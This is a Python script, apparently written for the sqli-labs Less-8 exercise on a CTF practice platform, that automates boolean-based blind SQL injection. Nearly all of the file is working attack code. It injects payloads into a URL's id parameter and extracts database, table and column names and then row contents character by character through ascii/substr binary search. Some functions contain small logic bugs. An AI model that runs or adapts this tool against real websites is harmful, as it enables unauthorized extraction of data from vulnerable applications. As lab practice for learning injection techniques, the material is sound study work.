#!/usr/bin/env python3
# _*_ coding: utf-8 _*_
#@Time  : 2020/3/30 14:23
#@Author: ChenZIDu
#@File  : 1.py

import requests
import time

s = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

url = "http://49cf477f-ba67-4f76-8724-29f7c85c7ef8.node3.buuoj.cn/Less-8/?id=1"
# def attack():
#         ## 查询数据库个数
#         for i in range(1,300):
#            time.sleep(0.06)
#            target="' and length(database())="+str(i)+" --+"
#            r=requests.get(url+target)
#            if 'You are in...........' in r.text:
#                return i
#                break

def database_num():
    # 数据库个数
    for i in range(1, 100):
        time.sleep(0.06)
        target = "' and (select count(schema_name) from information_schema.schemata)=" + str(i) + ";--+"
        r = requests.get(url + target)
        if 'You are in...........' in r.text:
            print("数据库个数："+str(i))
            return database(i)

def database(len):
    ## 查询数据库名
    database_name=""
    for i in range(0,len):
        time.sleep(0.06)
        num = 0  ## 当前表长度
        for j in range(1, 100):  ## 跑当前表名字长度
            time.sleep(0.06)
            target = "' and (select length(schema_name) from information_schema.schemata limit "+ str(i) +",1)=" + str(j) + ";--+"
            ## 跑数据名长度
            r = requests.get(url + target)
            if 'You are in...........' in r.text:
                num = j
        d_n = ""
        # print("第"+str(i)+"个数据库的长度为："+str(num))
        for j in range(1, num+1):
            time.sleep(0.06)
            left=65
            right=122
            while right-left>1:
                mid = int((left + right)/ 2)
                target = "' and ascii(substr((select schema_name from information_schema.schemata limit "+str(i)+",1),"+str(j)+",1))>"+str(mid)+"-- +"
                ## 跑当前表名字
                r = requests.get(url + target)
                if 'You are in...........' in r.text:
                    left=mid
                else:
                    right=mid
            d_n += chr(right)
        # print(d_n)
        database_name+= d_n+ "、"
    print("数据库："+database_name)

def table(s):
    #表个数
    for i in range(1,100):
        time.sleep(0.06)
        target="' and (select count(table_name) from information_schema.tables where table_schema='"+ s +"')="+str(i)+";--+"
        r=requests.get(url+target)
        if 'You are in...........' in r.text:
            return i

def table_name(table_num,s):
    ## 查询数据库里面的表名
    table_n=""
    # print(s)
    for i in range(0, table_num):
        time.sleep(0.06)
        # print(i)
        num=0 ## 当前表长度
        for j in range(1,100):  ## 跑当前表名字长度
            time.sleep(0.06)
            target = "' and (select length(table_name) from information_schema.tables where table_schema='"+s+"' limit "+str(i)+",1)="+str(j)+";--+"
            r = requests.get(url + target)
            if 'You are in...........' in r.text:
                num=j
                # print(num)
        t_n = ""
        # print(str(num)+"-1")
        for j in range(1,num+1):
            # print(j)
            left = 30
            right = 128
            while right - left > 1:
                mid = int((left + right) / 2)
                target = "' and ascii(substr((select table_name from information_schema.tables where table_schema='"+s+"' limit "+str(i)+",1),"+str(j)+",1))>"+str(mid)+"-- +"
                r = requests.get(url + target)
                if 'You are in...........' in r.text:
                    left = mid
                else:
                    right = mid
            t_n += chr(right)
            # print(t_n+"-")
        table_n += t_n +"、"
    return table_n

def column_num(table):
    # 表中字段个数
    for i in range(1, 100):
        time.sleep(0.06)
        target = "' and (select count(column_name) from information_schema.columns where table_schema='"+s+"' and table_name='"+table+"')=1--+"
        r = requests.get(url + target)
        if 'You are in...........' in r.text:
            print("一共有字段数："+str(i))
            return column(i,table)

def column(len,table):
    ## 查询字段名
    column_name = ""
    for i in range(0, len):
        time.sleep(0.06)
        num = 0  ## 当前字段长度
        for j in range(1, 100):  ## 跑当前字段名字长度
            time.sleep(0.06)
            target = "' and (select length(column_name) from information_schema.columns where table_schema='"+s+"' and table_name='"+table+"' limit "+str(i)+",1)="+str(j)+";--+"
            r = requests.get(url + target)
            if 'You are in...........' in r.text:
                num = j
        c_n = ""
        print("第"+str(i)+"个数据库的长度为："+str(num))
        for j in range(1, num + 1):
            time.sleep(0.06)
            left = 2
            right = 126
            while abs(right - left) > 1:
                mid = int((left + right) / 2)
                target = "' and ascii(substr((select column_name from information_schema.columns where table_schema='"+s+"' and table_name='"+table+"' limit "+str(i)+",1),"+str(j)+",1))>"+str(mid)+"--+"
                ## 跑当前表名字
                r = requests.get(url + target)
                if 'You are in...........' in r.text:
                    left = mid
                else:
                    right = mid
            c_n += chr(right)
        # print(d_n)
        column_name += c_n + "、"
    print("字段名："+column_name)

def table_column(data,table_name,column_name):
        ## 查询字段内信息
        column_num=0
        ## 字段内容数
        for i in range(1,1000):
           time.sleep(0.06)
           target="' and (select count("+column_name+") from "+data+"."+table_name+")="+str(i)+" --+"
           r=requests.get(url+target)
           if 'You are in...........' in r.text:
               column_num=i
               break
        print("一共有"+str(column_num)+"条数据")
        column_data=""
        for i in range(0,column_num+1):
            time.sleep(0.06)
            num = 0  ## 当前数据长度
            for j in range(1, 100):  ## 跑当前字段名字长度
                time.sleep(0.06)
                target = "' and (select length("+column_name+") from "+data+"."+table_name+" limit "+str(i)+",1)=" + str(j) + ";--+"
                r = requests.get(url + target)
                if 'You are in...........' in r.text:
                    num = j
            c_d=""
            for j in range(1,num+1):
                time.sleep(0.06)
                left = 2
                right = 126
                while abs(right - left) > 1:
                    mid = int((left + right) / 2)
                    target = "' and ascii(substr((select "+column_name+" from "+data+"."+table_name+"  limit "+str(i)+",1),"+str(j)+",1))>"+str(mid)+" -- +"
                    ## 跑当前数据
                    r = requests.get(url + target)
                    if 'You are in...........' in r.text:
                        left = mid
                    else:
                        right = mid
                c_d += chr(right)
                # print(d_n)
            column_data += c_d + "、"
        print("第"+str(i)+"条数据为："+column_data)
#42


if __name__=='__main__':
    database_num()
    s= input("输入你要查询的数据库：")
    table_num=table(s)                 ## 可以更改传入的表值
    print("该表一共有："+str(table_num))
    table_n=table_name(table_num,s)
    print("当前的"+str(table_num)+"个表分别是："+table_n)
    table = input("输入你要查询的表：")
    column_num(table)
    column_name=input("输入要查询字段：")
    table_column(s,table,column_name)



